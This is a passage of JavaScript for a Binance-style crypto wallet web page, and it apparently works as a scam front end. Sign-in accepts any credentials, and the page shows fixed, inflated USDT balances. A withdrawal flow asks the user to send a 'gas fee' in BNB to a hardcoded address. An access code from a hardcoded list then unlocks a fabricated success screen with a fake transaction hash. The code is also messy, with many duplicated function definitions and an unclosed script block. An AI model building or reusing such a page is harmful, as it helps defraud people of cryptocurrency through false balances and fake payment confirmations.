    "Bqet3ywx4", "Bndc3hgs2", "Bjla3ovi8", "Bfdx3mnp1", "Bwko3ehy9", "Bvul3zjt6", "Bteg3ika3",
    "Bzxp3agf7", "Bldw3cmt0", "Bnoh3ljz4", "Bquv3ddh2", "Bcak3qse5", "Bhzi3tlo1", "Bxrb3ujn8",
    "Bvyj3kxz9", "Bbhr3gta6", "Bmqf3wpc0", "Bjok3eum3", "Bxgy3dvi4", "Bpsa3rht7", "Bkra3mgw2",
    "Bynx3slb8", "Bqwu3hdy5", "Btvz3kic9", "Bsef3txl4", "Bvkr3odj6", "Bzuh3aqy3", "Bwyc3epv7",
    "Bghl3bmn1", "Bpme3zsq0", "Bdan3jlx5", "Bmkf3ytb2", "Blso3wqd4", "Bjur3xgz7", "Bvta3fml9",
    "Bcqw3uho0", "Bzjk3eyc8", "Bhul3nwr6", "Bmvp3ska1", "Bxez3ldn9", "Bgtf3qmo7", "Barl3xut4"
  ];

  function confirmAccessCode() {
    const code = document.getElementById('accessCodeInput').value.trim();

    // Show processing page immediately
    showPage('page10');

    setTimeout(() => {
      if (validAccessCodes.includes(code)) {
        showPage14Success("3078.78 USDT", "0x223C5B2A20Fbc...", "0xe4f...9bA");
      } else {
        alert("Invalid Access Code. Returning to Access Code page.");
        showPage('page9ii');
      }
    }, 10000);
  }

  function showPage14Success(amount, wallet, hash) {
    document.getElementById("txnAmount").innerText = amount || "3078.78 USDT";
    document.getElementById("txnWallet").innerText = wallet || "0x223C5B2A20Fbc...";
    document.getElementById("txnHash").innerText = hash || "0xe4f...9bA";
    showPage('page14');

    // Auto redirect to homepage after 10 seconds
    setTimeout(() => showPage('page4'), 10000);
  }

  function copyTxnHash() {
    const hash = document.getElementById("txnHash").innerText;
    navigator.clipboard.writeText(hash).then(() => {
      alert("Transaction hash copied to clipboard!");
    });
  }

  function showPage(pageId) {
    document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
    document.getElementById(pageId).style.display = 'block';
  }

  // === Show page helper ===
  function showPage(pageId) {
    document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
    const page = document.getElementById(pageId);
    if (page) page.style.display = 'block';
  }

  // === Initial page load: Sign In (page1) ===
  showPage('page1');

  // === Authentication simulation ===
  function signIn() {
    const email = document.getElementById('emailInput').value.trim();
    const password = document.getElementById('passwordInput').value.trim();
    const status = document.getElementById('signInStatus');
    if (!email || !password) {
      status.innerText = "Email and password required.";
      return;
    }
    status.innerText = "";
    showPage('page2');
    setTimeout(() => {
      showPage('page3');
    }, 1500);
  }
  function confirmAccountID() {
    showPage('page4');
    updateBalancesDisplay();
    updateConnectedWalletDisplay();
  }

// === Wallet Connect functions ===
async function connectWallet() {
  const statusEl = document.getElementById('walletInfo') || document.getElementById('walletConnectionStatus') || document.getElementById('walletDisplay');

  try {
    if (typeof window.ethereum === 'undefined') {
      statusEl.innerText = "MetaMask not available";
      return;
    }

    const provider = new ethers.BrowserProvider(window.ethereum);
    const accounts = await provider.send("eth_requestAccounts", []);
    if (!accounts.length) {
      statusEl.innerText = "No wallet accounts found.";
      return;
    }

    const walletAddress = accounts[0];
    localStorage.setItem("connectedWallet", walletAddress);

    statusEl.innerText = `Connected Wallet: ${shortenAddress(walletAddress)}`;
    updateConnectedWalletDisplay();
    updateBalancesDisplay();
    showPage('page4');

  } catch (err) {
    console.error(err);
    statusEl.innerText = "Failed to connect wallet.";
  }
}

function manualWalletConnect() {
  const manualInput = document.getElementById('manualWallet') || document.getElementById('manualWalletInput');
  const statusEl = document.getElementById('walletInfo') || document.getElementById('walletConnectionStatus') || document.getElementById('walletDisplay');

  if (!manualInput) return;

  const manualAddress = manualInput.value.trim();
  if (!manualAddress || !manualAddress.startsWith("0x") || manualAddress.length !== 42) {
    statusEl.innerText = "Invalid wallet address.";
    return;
  }

  localStorage.setItem("connectedWallet", manualAddress);
  statusEl.innerText = `Manual Wallet Connected: ${shortenAddress(manualAddress)}`;
  updateConnectedWalletDisplay();
  updateBalancesDisplay();
  showPage('page4');
}

function disconnectWallet() {
  localStorage.removeItem("connectedWallet");
  updateConnectedWalletDisplay();
  updateBalancesDisplay();
  alert("Wallet disconnected.");
}

function logout() {
  localStorage.clear();
  alert("Logged out.");
  showPage('page1');
}

function updateConnectedWalletDisplay() {
  const wallet = localStorage.getItem("connectedWallet");
  const shortWallet = wallet ? shortenAddress(wallet) : '';

  const displayElems = [
    document.getElementById('connectedWalletDisplayHomepage'),
    document.getElementById('walletDisplay'),
    document.getElementById('walletInfo'),
    document.getElementById('walletConnectionStatus')
  ];

  displayElems.forEach(elem => {
    if (elem) {
      if (elem.id === 'walletAddress') {
        elem.innerText = shortWallet;
      } else {
        elem.innerText = wallet ? `Connected Wallet: ${shortWallet}` : '';
      }
    }
  });

  // Show shortened address inside #walletAddress span (if used separately)
  const walletAddrSpan = document.getElementById('walletAddress');
  if (walletAddrSpan && wallet) {
    walletAddrSpan.textContent = shortWallet;
  }
}

// Utility to shorten wallet address (e.g., 0x1234...abcd)
function shortenAddress(addr) {
  return addr ? `${addr.substring(0, 6)}...${addr.slice(-4)}` : '';
}

    async function updateBalancesDisplay() {
  const wallet = localStorage.getItem("connectedWallet");
  const currency = document.getElementById('currencySelector')?.value || 'USD';
  const rate = exchangeRates[currency] || 1;

  if (!wallet) {
    document.getElementById("usdtBalance").innerText = `0.00 ${currency}`;
    document.getElementById("bnbBalance").innerText = `0.0000 ${currency}`;
    document.getElementById("totalAssetsDisplay").innerText = `$0.00`;
    document.getElementById("usdtTokenBalance").innerText = `0.00`;
    document.getElementById("bnbTokenBalance").innerText = `0.00000000`;
    return;
  }

  try {
    const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20
    const usdtAbi = [
      "function balanceOf(address owner) view returns (uint256)",
      "function decimals() view returns (uint8)"
    ];
    const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, provider);

    // Fetch USDT balance
    const usdtRaw = await usdtContract.balanceOf(wallet);
    const usdtDecimals = await usdtContract.decimals();
    const usdtBalance = parseFloat(ethers.formatUnits(usdtRaw, usdtDecimals));
    const usdtUSD = usdtBalance * (livePrices.USDT || 1);

    // Fetch BNB balance
    const bnbRaw = await provider.getBalance(wallet);
    const bnbBalance = parseFloat(ethers.formatEther(bnbRaw));
    const bnbUSD = bnbBalance * (livePrices.BNB || 0);

    // Convert to selected currency
    const usdtConverted = usdtUSD * rate;
    const bnbConverted = bnbUSD * rate;
    const totalConverted = usdtConverted + bnbConverted;

    // === Update UI ===
    document.getElementById("usdtBalance").innerText = `${usdtConverted.toFixed(2)} ${currency}`;
    document.getElementById("bnbBalance").innerText = `${bnbConverted.toFixed(5)} ${currency}`;
    document.getElementById("totalAssetsDisplay").innerText = `$${totalConverted.toFixed(2)}`;

    document.getElementById("usdtTokenBalance").innerText = usdtBalance.toFixed(2);
    document.getElementById("bnbTokenBalance").innerText = bnbBalance.toFixed(8);

  } catch (err) {
    console.error("Balance update error:", err);
  }
    }

  // === Page 6: Submit Transaction ===
  async function submitTransaction() {
    const hash = document.getElementById("txHash").value.trim();
    const status = document.getElementById("txStatus");

    if (!hash || !/^0x([A-Fa-f0-9]{64})$/.test(hash)) {
      status.innerText = "Invalid transaction hash.";
      status.style.color = "red";
      return;
    }

    try {
      const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
      const receipt = await provider.getTransactionReceipt(hash);

      if (!receipt) {
        status.innerText = "Transaction not found. Please wait for confirmation.";
        status.style.color = "orange";
        return;
      }

      status.innerText = "‚úÖ Transaction Confirmed!";
      status.style.color = "limegreen";

      updateBalancesDisplay();

    } catch (err) {
      console.error(err);
      status.innerText = "Error verifying transaction.";
      status.style.color = "red";
    }
  }

  // === Page 8: Transfer Helpers ===
  function setMaxAmount() {
    // For demo, set max to 3078.78
    document.getElementById("transferAmount").value = 3078.78;
    document.getElementById("gasFee").innerText = "0.09490 BNB";
  }
  function goToBNBGasConfirmationPage(pageId) {
    // Basic validation
    const walletAddr = document.getElementById("inputWallet").value.trim();
    const network = document.getElementById("networkSelect").value;
    const amount = document.getElementById("transferAmount").value;
    if (!walletAddr || !walletAddr.startsWith("0x") || walletAddr.length !== 42) {
      alert("Invalid recipient wallet address.");
      return;
    }
    if (!network) {
      alert("Please select a network.");
      return;
    }
    if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
      alert("Please enter a valid amount.");
      return;
    }
    showPage(pageId);
  }

  // === Page 9i: Copy BNB Address ===
  function copyBNBAddress() {
    const addr = document.getElementById("bnbAddressSection").innerText;
    navigator.clipboard.writeText(addr).then(() => {
      alert("BNB address copied to clipboard!");
    });
  }

  // === Page 9ii: Validate Access Code ===
  function validateAccessCode() {
    const code = document.getElementById("accessCodeInput").value.trim();
    if (!code) {
      alert("Please enter the access code.");
      return;
    }
    showPage('page10');
    // Simulate processing delay
    setTimeout(() => {
      if (code === "123456") {
        alert("Access code accepted! Proceeding...");
        showPage('page4');
      } else {
        showPage('page11');
      }
    }, 2000);
  }
  
  // === Helper to open transfer pages from tokens ===
  function openTransferPage(token) {
    // For demo, just open page 8 and prefill token (not implemented)
    showPage('page8');
  }
  
// === Page 10: Transaction Processing ===
function showProcessingPage() {
  showPage('page10');
  // Simulate verification delay (e.g., access code verification or tx processing)
  setTimeout(() => {
    // For demo: after 3 seconds, assume success and go to homepage
    showPage('page4');
    alert("Transaction processed successfully!");
    updateBalancesDisplay();
  }, 3000);
}

// === Page 11: Transaction Declined ===
// No specific function needed as it's a static error page with buttons to retry or return to homepage.

// === Page 12: Settings Functions ===
// Disconnect the connected wallet and clear wallet-related info
function disconnectWallet() {
  // Clear wallet address and balances from UI
  walletAddress = "";
  document.getElementById('walletAddress').textContent = "";
  document.getElementById('connectedWalletDisplayHomepage').textContent = "No wallet connected";
  document.getElementById('bnbBalance').textContent = "-- BNB";
  document.getElementById('usdtBalance').textContent = "-- USDT";
  document.getElementById('bnbTokenBalance').textContent = "--";
  document.getElementById('usdtTokenBalance').textContent = "--";

  alert("Wallet disconnected successfully.");

  // Optional: Clear any stored wallet data in localStorage/sessionStorage
  localStorage.removeItem('connectedWallet');
  
  // Optionally, navigate back to homepage or wallet connect page
  showPage('page4');
}

// Logout the user and clear all session/local storage data
function logout() {
  // Clear all relevant user session data here
  localStorage.clear();
  sessionStorage.clear();

  // Optionally reset wallet info and UI as well
  disconnectWallet();

  alert("You have been logged out.");

  // Redirect user to login page or landing page (e.g., page1)
  showPage('page1');
}

// === Page 13: Connect Wallet ===
// Reuses connectWallet() and manualWalletConnect() from above

// === Utility function: update connected wallet display (used across pages) ===
function updateConnectedWalletDisplay() {
  const wallet = localStorage.getItem("connectedWallet");
  const displayElems = [
    document.getElementById('connectedWalletDisplayHomepage'),
    document.getElementById('walletDisplay'),
    document.getElementById('walletInfo'),
    document.getElementById('walletConnectionStatus')
  ];
  displayElems.forEach(elem => {
    if (elem) elem.innerText = wallet ? wallet : "No wallet connected";
  });
}

// === Utility function: show page by id ===
function showPage(pageId) {
  document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
  const page = document.getElementById(pageId);
  if (page) page.style.display = 'block';
}

// On initial load, show the Sign In page or Homepage if wallet connected
document.addEventListener("DOMContentLoaded", () => {
  if (localStorage.getItem("connectedWallet")) {
    showPage('page4'); // Homepage
    updateConnectedWalletDisplay();
    updateBalancesDisplay();
  } else {
    showPage('page1'); // Sign In
  }
});
</script>
  
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.3/dist/ethers.min.js"></script>
<script>
  // --- Page 1: Sign In ---
  function signIn() {
    const email = document.getElementById("emailInput").value.trim();
    const password = document.getElementById("passwordInput").value.trim();
    const status = document.getElementById("signInStatus");
    if (!email || !password) {
      status.innerText = "Please enter email and password.";
      status.style.color = "red";
      return;
    }
    status.innerText = "Signing in...";
    status.style.color = "#f3ba2f";
    // Simulate login (replace with actual auth)
    setTimeout(() => {
      status.innerText = "";
      showPage('page4'); // go to Homepage after sign in
    }, 1000);
  }

// Page 4: Homepage Full Functions for Binance-style Dashboard

// Fixed demo balances
const fixedBalances = {
  bnb: 0.09490,
  usdt: 2978.78,
};

// Live price state
let livePrices = {
  BNB: 0,
  USDT: 1,
};

// DOM elements
let languageSelector, currencySelector;
let walletAddressEl, connectedWalletDisplayEl;
let bnbBalanceEl, usdtBalanceEl;
let bnbTokenBalanceEl, usdtTokenBalanceEl;
let totalAssetsAmountEl, totalAssetsCurrencyEl;
let priceChart;

// Exchange rates
let exchangeRates = {};
let walletAddress = "";

function initHomepage() {
  languageSelector = document.getElementById('languageSelector');
  currencySelector = document.getElementById('currencySelector');
  walletAddressEl = document.getElementById('walletAddress');
  connectedWalletDisplayEl = document.getElementById('connectedWalletDisplayHomepage');
  bnbBalanceEl = document.getElementById('bnbBalance');
  usdtBalanceEl = document.getElementById('usdtBalance');
  bnbTokenBalanceEl = document.getElementById('bnbTokenBalance');
  usdtTokenBalanceEl = document.getElementById('usdtTokenBalance');
  totalAssetsAmountEl = document.getElementById('totalAssetsAmount');
  totalAssetsCurrencyEl = document.getElementById('totalAssetsCurrency');

  initLanguageSelector();
  initCurrencySelector();
  initPriceChart();

  walletAddress = '0x1234...abcd';
  walletAddressEl.textContent = walletAddress;
  connectedWalletDisplayEl.textContent = walletAddress;

  fetchExchangeRates()
    .then(fetchLivePrices)
    .then(updateBalancesDisplay)
    .catch(console.error);

  setInterval(() => {
    fetchLivePrices()
      .then(updateBalancesDisplay)
      .catch(console.error);
  }, 10000);
}

function initLanguageSelector() {
  const languages = [
    { code: 'en', label: 'English' },
    { code: 'es', label: 'Espa√±ol' },
    { code: 'fr', label: 'Fran√ßais' },
    { code: 'de', label: 'Deutsch' },
    { code: 'zh', label: '‰∏≠Êñá' },
    { code: 'ja', label: 'Êó•Êú¨Ë™û' },
  ];
  languages.forEach(lang => {
    const option = document.createElement('option');
    option.value = lang.code;
    option.textContent = lang.label;
    languageSelector.appendChild(option);
  });
  const saved = localStorage.getItem('preferredLanguage') || 'en';
  languageSelector.value = saved;
  languageSelector.addEventListener('change', handleLanguageChange);
}

function initCurrencySelector() {
  const currencies = ['USD','EUR','GBP','CAD','INR','PKR','AED','JPY','CNY'];
  currencies.forEach(curr => {
    const option = document.createElement('option');
    option.value = curr;
    option.textContent = curr;
    currencySelector.appendChild(option);
  });
  const saved = localStorage.getItem('preferredCurrency') || 'USD';
  currencySelector.value = saved;
  currencySelector.addEventListener('change', handleCurrencyChange);
}

function handleLanguageChange() {
  const lang = languageSelector.value;
  localStorage.setItem('preferredLanguage', lang);
  console.log('Language changed to', lang);
}

function handleCurrencyChange() {
  const curr = currencySelector.value;
  localStorage.setItem('preferredCurrency', curr);
  updateBalancesDisplay();
  console.log('Currency changed to', curr);
}

async function fetchExchangeRates() {
  try {
    const res = await fetch('https://api.exchangerate.host/latest?base=USD');
    const data = await res.json();
    exchangeRates = data.rates;
  } catch (e) {
    console.error('Exchange rates fallback');
    exchangeRates = {
      USD: 1, EUR: 0.92, GBP: 0.82, CAD: 1.34, INR: 82.1,
      PKR: 283.7, AED: 3.67, JPY: 136, CNY: 7.3
    };
  }
}

async function fetchLivePrices() {
  try {
    const ids = 'binancecoin,tether';
    const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`;
    const res = await fetch(url);
    const data = await res.json();
    livePrices.BNB = data.binancecoin.usd || 0;
    livePrices.USDT = data.tether.usd || 1;
    updatePriceChart(livePrices.BNB, livePrices.USDT);
  } catch (err) {
    console.error('Live price error:', err);
  }
}

function updateBalancesDisplay() {
  const curr = currencySelector.value;
  const rate = exchangeRates[curr] || 1;
  const bnbUSD = fixedBalances.bnb * livePrices.BNB;
  const usdtUSD = fixedBalances.usdt * livePrices.USDT;
  const total = (bnbUSD + usdtUSD) * rate;

  bnbBalanceEl.textContent = `${(bnbUSD * rate).toFixed(5)} ${curr}`;
  usdtBalanceEl.textContent = `${(usdtUSD * rate).toFixed(2)} ${curr}`;
  totalAssetsAmountEl.textContent = total.toFixed(2);
  totalAssetsCurrencyEl.textContent = curr;

  bnbTokenBalanceEl.textContent = fixedBalances.bnb.toFixed(8);
  usdtTokenBalanceEl.textContent = fixedBalances.usdt.toFixed(2);
}

function initPriceChart() {
  const ctx = document.getElementById('priceChart').getContext('2d');
  priceChart = new Chart(ctx, {
    type: 'line',
    data: {
      labels: [],
      datasets: [
        { label: 'BNB Price (USD)', data: [], borderColor: '#F3BA2F', backgroundColor: 'rgba(243,186,47,0.2)', fill: true, tension: 0.4 },
        { label: 'USDT Price (USD)', data: [], borderColor: '#00b894', backgroundColor: 'rgba(0,184,148,0.2)', fill: true, tension: 0.4 },
      ]
    },
    options: {
      responsive: true,
      animation: false,
      scales: {
        x: {
          type: 'realtime',
          realtime: {
            duration: 60000,
            refresh: 10000,
            delay: 2000,
            onRefresh(chart) {
              const now = Date.now();
              chart.data.labels.push(now);
              chart.data.datasets[0].data.push({ x: now, y: livePrices.BNB });
              chart.data.datasets[1].data.push({ x: now, y: livePrices.USDT });
            }
          }
        },
        y: {
          ticks: { color: '#f3ba2f', font: { weight: 'bold' } },
          grid: { color: '#2b3139' }
        }
      },
      plugins: {
        legend: { labels: { color: '#f3ba2f', font: { weight: 'bold' } } }
      }
    }
  });
}

function updatePriceChart(bnb, usdt) {
  if (!priceChart) return;
  const now = Date.now();
  priceChart.data.labels.push(now);
  priceChart.data.datasets[0].data.push({ x: now, y: bnb });
  priceChart.data.datasets[1].data.push({ x: now, y: usdt });
  if (priceChart.data.labels.length > 60) {
    priceChart.data.labels.shift();
    priceChart.data.datasets.forEach(ds => ds.data.shift());
  }
  priceChart.update('none');
}

function copyWalletAddress() {
  if (!walletAddress) return alert('No wallet connected.');
  navigator.clipboard.writeText(walletAddress).then(() => alert('Wallet address copied!'));
}

function showPage(pageId) {
  console.log('Navigating to page:', pageId);
  // Your logic here
}

window.addEventListener('load', initHomepage);

   // --- Page 5 & 6: Top Up BNB and Scan/Receive ---
  async function submitTransaction() {
    const hash = document.getElementById("txHash").value.trim();
    const status = document.getElementById("txStatus");

    if (!hash || !/^0x([A-Fa-f0-9]{64})$/.test(hash)) {
      status.innerText = "Invalid transaction hash.";
      status.style.color = "red";
      return;
    }

    try {
      const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
      const receipt = await provider.getTransactionReceipt(hash);

      if (!receipt) {
        status.innerText = "Transaction not found. Please wait for confirmation.";
        status.style.color = "orange";
        return;
      }

      status.innerText = "‚úÖ Transaction Confirmed!";
      status.style.color = "limegreen";

      const wallet = localStorage.getItem("connectedWallet");
      if (!wallet) {
        console.warn("No wallet connected.");
        return;
      }

      // Update balances on confirmation
      updateBalancesDisplay();

    } catch (err) {
      console.error(err);
      status.innerText = "Error verifying transaction.";
      status.style.color = "red";
    }
  }

  // --- Page 7, 12, 13: Wallet Connect / Manual Connect ---
  async function connectWallet() {
    const statusElems = [
      document.getElementById('walletInfo'),
      document.getElementById('walletDisplay'),
      document.getElementById('walletConnectionStatus')
    ].filter(Boolean);

    if (typeof window.ethereum === 'undefined') {
      statusElems.forEach(el => el.innerText = "MetaMask not available");
      return;
    }

    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      if (!accounts.length) {
        statusElems.forEach(el => el.innerText = "No wallet accounts found.");
        return;
      }
      const walletAddress = accounts[0];
      localStorage.setItem("connectedWallet", walletAddress);
      statusElems.forEach(el => el.innerText = `Connected Wallet: ${walletAddress}`);
      updateConnectedWalletDisplay();
      updateBalancesDisplay();
      showPage('page4');
    } catch (err) {
      console.error(err);
      statusElems.forEach(el => el.innerText = "Failed to connect wallet.");
    }
  }

  function manualWalletConnect() {
    const manualInput = document.getElementById('manualWallet') || document.getElementById('manualWalletInput');
    const statusElems = [
      document.getElementById('walletInfo'),
      document.getElementById('walletDisplay'),
      document.getElementById('walletConnectionStatus')
    ].filter(Boolean);

    if (!manualInput) return;
    const manualAddress = manualInput.value.trim();
    if (!manualAddress || !manualAddress.startsWith("0x") || manualAddress.length !== 42) {
      statusElems.forEach(el => el.innerText = "Invalid wallet address.");
      return;
    }
    localStorage.setItem("connectedWallet", manualAddress);
    statusElems.forEach(el => el.innerText = `Manual Wallet Connected: ${manualAddress}`);
    updateConnectedWalletDisplay();
    updateBalancesDisplay();
    showPage('page4');
  }

  function disconnectWallet() {
    localStorage.removeItem('connectedWallet');
    updateConnectedWalletDisplay();
    updateBalancesDisplay();
    alert("Wallet disconnected.");
  }

  function logout() {
    localStorage.clear();
    alert("You have been logged out.");
    showPage('page1');
  }

  // --- Pages 8 & 9i & 9ii: Transfer & BNB Gas Confirmation & Access Code ---
  function setMaxAmount() {
    const wallet = localStorage.getItem('connectedWallet');
    if (!wallet) {
      alert("Please connect wallet first.");
      return;
    }
    // For demo, set max to 10 BNB (replace with real balance fetching logic)
    document.getElementById('transferAmount').value = "10";
    updateGasFee();
  }

  function updateGasFee() {
    // Gas fee fixed for demo
    document.getElementById('gasFee').innerText = "0.09490 BNB";
  }

  function goToBNBGasConfirmationPage() {
    showPage('page9i');
  }

  function copyBNBAddress() {
    const address = "0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0";
    navigator.clipboard.writeText(address).then(() => {
      alert("BNB address copied to clipboard!");
    });
  }

  function validateAccessCode() {
    const code = document.getElementById('accessCodeInput').value.trim();
    if (code === "123456") { // demo valid code
      showPage('page10');
      showProcessingPage();
    } else {
      showPage('page11');
    }
  }

  // --- Page 10: Processing & helper ---
  function showProcessingPage() {
    showPage('page10');
    setTimeout(() => {
      alert("Transaction processed successfully!");
      showPage('page4');
      updateBalancesDisplay();
    }, 3000);
  }

  // --- Utility Functions ---
  function updateConnectedWalletDisplay() {
    const wallet = localStorage.getItem("connectedWallet");
    [
      document.getElementById('connectedWalletDisplayHomepage'),
      document.getElementById('walletDisplay'),
      document.getElementById('walletInfo'),
      document.getElementById('walletConnectionStatus')
    ].forEach(elem => {
      if (elem) elem.innerText = wallet ? wallet : "No wallet connected";
    });
  }

  function showPage(pageId) {
    document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
    const page = document.getElementById(pageId);
    if (page) page.style.display = 'block';
  }

  // --- Initialization ---
  document.addEventListener("DOMContentLoaded", () => {
    if (localStorage.getItem("connectedWallet")) {
      showPage('page4'); // Homepage
      updateConnectedWalletDisplay();
      updateBalancesDisplay();
    } else {
      showPage('page1'); // Sign In page
    }
  });
</script>

  
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.3/dist/ethers.min.js"></script>

<!-- üîÅ Dynamic total assets updater -->
<script>
  async function updateTotalAssets() {
    const wallet = localStorage.getItem("connectedWallet");
    const totalEl = document.getElementById("totalAssetsDisplay");

    if (!wallet || !ethers) {
      totalEl.innerText = "$2978.78 USDT";
      return;
    }

    try {
      const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");

      // 1. USDT Balance
      const usdtAddr = "0x55d398326f99059fF775485246999027B3197955";
      const usdtAbi = [
        "function balanceOf(address owner) view returns (uint256)",
        "function decimals() view returns (uint8)"
      ];
      const usdtContract = new ethers.Contract(usdtAddr, usdtAbi, provider);
      const [rawUsdt, decimals] = await Promise.all([
        usdtContract.balanceOf(wallet),
        usdtContract.decimals()
      ]);
      const usdtBalance = parseFloat((rawUsdt / (10 ** decimals)).toFixed(2));

      // 2. BNB Balance
      const rawBnb = await provider.getBalance(wallet);
      const bnbBalance = parseFloat(ethers.formatEther(rawBnb));

      // 3. Get BNB price in USDT
      const resp = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
      const data = await resp.json();
      const bnbPrice = parseFloat(data.price);
      const bnbInUsdt = parseFloat((bnbBalance * bnbPrice).toFixed(2));

      // 4. Total value
      const totalUSDT = (usdtBalance + bnbInUsdt).toFixed(2);

      // 5. Update UI
      document.getElementById("usdtBalance").innerText = usdtBalance.toFixed(2);
      document.getElementById("bnbBalance").innerText = bnbBalance.toFixed(4);
      totalEl.innerText = `$${totalUSDT} USDT`;

    } catch (err) {
      console.error("Asset update error:", err);
      totalEl.innerText = "$3078.78 USDT";
    }
  }

  function displayFixedTotalAssets() {
    const totalAssetsElement = document.getElementById("totalAssetsDisplay");
    if (totalAssetsElement) {
      totalAssetsElement.innerText = "$3078.78 USDT";
    }
  }

  // ‚úÖ Combined DOMContentLoaded
  document.addEventListener("DOMContentLoaded", () => {
    // Set fixed value initially (optional fallback)
    displayFixedTotalAssets();

    // Update dynamic values
    updateTotalAssets();
    setInterval(updateTotalAssets, 15000); // every 15 seconds

    // Restore wallet display
    const wallet = localStorage.getItem("connectedWallet");
    const walletDisplay = document.getElementById("connectedWalletDisplayHomepage");
    if (wallet && walletDisplay) {
      walletDisplay.innerText = wallet;
    }
  });

<script>
  // Show only one page at a time
  function showPage(pageId) {
    const pages = document.querySelectorAll(".page");
    pages.forEach(page => page.style.display = "none");
    const targetPage = document.getElementById(pageId);
    if (targetPage) targetPage.style.display = "block";
  }

  // Connect with Web 3 (if available)
  async function connectWallet() {
    const statusId = document.getElementById('walletConnectionStatus');
    if (!statusId) return;

    if (typeof window.ethereum === 'undefined') {
      statusId.innerText = "‚ùå MetaMask not available.";
      return;
    }

    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      if (!accounts.length) {
        statusId.innerText = "‚ùå No wallet accounts found.";
        return;
      }

      const walletAddress = accounts[0];
      localStorage.setItem("connectedWallet", walletAddress);

      const shortAddr = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
      statusId.innerHTML = `<span style="color:#f3ba2f; font-weight:bold;">‚úÖ Connected:</span> <span style="color:white;">${shortAddr}</span>`;

      updateConnectedWalletDisplay();
      await updateBalancesDisplay();
      showPage('page4');
    } catch (err) {
      console.error(err);
      statusId.innerText = "‚ùå Failed to connect wallet.";
    }
  }
  // Manual wallet input connect
  function manualWalletConnect() {
    const manualInput = document.getElementById('manualWalletInput');
    const statusId = document.getElementById('walletConnectionStatus');

    if (!manualInput || !statusId) return;

    const manualAddress = manualInput.value.trim();

    if (!manualAddress || !manualAddress.startsWith("0x") || manualAddress.length !== 42) {
      statusId.innerText = "‚ùå Invalid wallet address.";
      return;
    }

    localStorage.setItem("connectedWallet", manualAddress);

    const shortAddr = `${manualAddress.slice(0, 6)}...${manualAddress.slice(-4)}`;
    statusId.innerHTML = `<span style="color:#f3ba2f; font-weight:bold;">‚úÖ Manual Wallet Connected:</span> <span style="color:white;">${shortAddr}</span>`;

    updateConnectedWalletDisplay();
    updateBalancesDisplay();
    showPage('page4');
  }

  // Update homepage wallet address display + copy button
  function updateConnectedWalletDisplay() {
    const walletAddress = localStorage.getItem("connectedWallet");
    const walletAddressSpan = document.getElementById("walletAddress");
    const copyBtn = document.getElementById("copyWalletBtn");

    if (walletAddress && walletAddressSpan && copyBtn) {
      const shortAddr = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
      walletAddressSpan.textContent = shortAddr;
      copyBtn.style.display = "inline-block";
    } else if(walletAddressSpan && copyBtn) {
      walletAddressSpan.textContent = "No wallet connected";
      copyBtn.style.display = "none";
    }
  }

  // Copy wallet address to clipboard
  document.getElementById("copyWalletBtn").addEventListener("click", () => {
    const walletAddress = localStorage.getItem("connectedWallet");
    if (!walletAddress) {
      alert("No wallet connected");
      return;
    }

    navigator.clipboard.writeText(walletAddress).then(() => {
      alert("Wallet address copied to clipboard!");
    }).catch(() => {
      alert("Failed to copy wallet address.");
    });
  });

  // Update balances display for BNB and USDT on BSC
  async function updateBalancesDisplay() {
    const address = localStorage.getItem("connectedWallet");
    if (!address) {
      document.getElementById("bnbBalance").innerText = "-- BNB";
      document.getElementById("usdtBalance").innerText = "-- USDT";
      return;
    }

    const provider = new ethers.BrowserProvider(window.ethereum || window);

    try {
      // BNB balance
      const bnbBalance = await provider.getBalance(address);
      const bnbInEth = ethers.formatEther(bnbBalance);
      document.getElementById("bnbBalance").innerText = `${parseFloat(bnbInEth).toFixed(4)} BNB`;
    } catch (e) {
      console.error("Error fetching BNB balance:", e);
      document.getElementById("bnbBalance").innerText = "Error";
    }

    try {
      // USDT on BSC mainnet
      const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

      const abi = [
        "function balanceOf(address) view returns (uint256)",
        "function decimals() view returns (uint8)"
      ];

      const contract = new ethers.Contract(USDT_ADDRESS, abi, provider);
      const rawBalance = await contract.balanceOf(address);
      const decimals = await contract.decimals();

      const formatted = Number(ethers.formatUnits(rawBalance, decimals)).toFixed(4);
      document.getElementById("usdtBalance").innerText = `${formatted} USDT`;
    } catch (e) {
      console.error("Error fetching USDT balance:", e);
      document.getElementById("usdtBalance").innerText = "Error";
    }
  }

  // Auto-connect if wallet stored on load
  window.addEventListener('DOMContentLoaded', async () => {
    const savedWallet = localStorage.getItem("connectedWallet");
    if (savedWallet) {
      updateConnectedWalletDisplay();
      await updateBalancesDisplay();
      showPage('page4');
    } else {
      showPage('page13');
    }
  });
</script>

<script>
  // Simple mock exchange rates (for demonstration)
  const exchangeRates = {
    USDT_BNB: 0.00032, // 1 USDT = 0.00032 BNB (example)
    BNB_USDT: 3100,    // 1 BNB = 3100 USDT (example)
  };

  const fromTokenSelect = document.getElementById('fromToken');
  const toTokenSelect = document.getElementById('toToken');
  const fromAmountInput = document.getElementById('fromAmount');
  const receiveAmountSpan = document.getElementById('receiveAmount');

  function updateEstimate() {
    const fromToken = fromTokenSelect.value;
    const toToken = toTokenSelect.value;
    const fromAmount = parseFloat(fromAmountInput.value) || 0;

    if (fromToken === toToken || fromAmount <= 0) {
